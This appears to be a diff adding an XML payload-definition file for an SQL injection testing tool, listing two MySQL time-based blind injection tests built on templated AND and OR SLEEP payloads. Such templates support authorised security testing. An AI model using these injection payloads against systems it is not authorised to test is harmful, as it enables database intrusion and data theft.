@@ -1,0 +1,24 @@
+
+<root>
+    <test>
+        <title>MySQL AND time-based blind (SLEEP)</title>
+        <stype>1</stype>
+        <clause>1,8,9</clause>
+        <where>1</where>
+        <desc>AND sleep(_SLEEPTIME)</desc>
+        <payload>[AND] [SLEEP][(][ACTION][)]</payload>
+        <time></time>
+        <dbms>MySQL</dbms>
+    </test>
+
+    <test>
+        <title>MySQL OR time-based blind (SLEEP)</title>
+        <stype>1</stype>
+        <clause>1,9</clause>
+        <where>2</where>
+        <desc>OR sleep(_SLEEPTIME)</desc>
+        <payload>[OR] [SLEEP][(][ACTION][)]</payload>
+        <time></time>
+        <dbms>MySQL</dbms>
+    </test>
+</root>
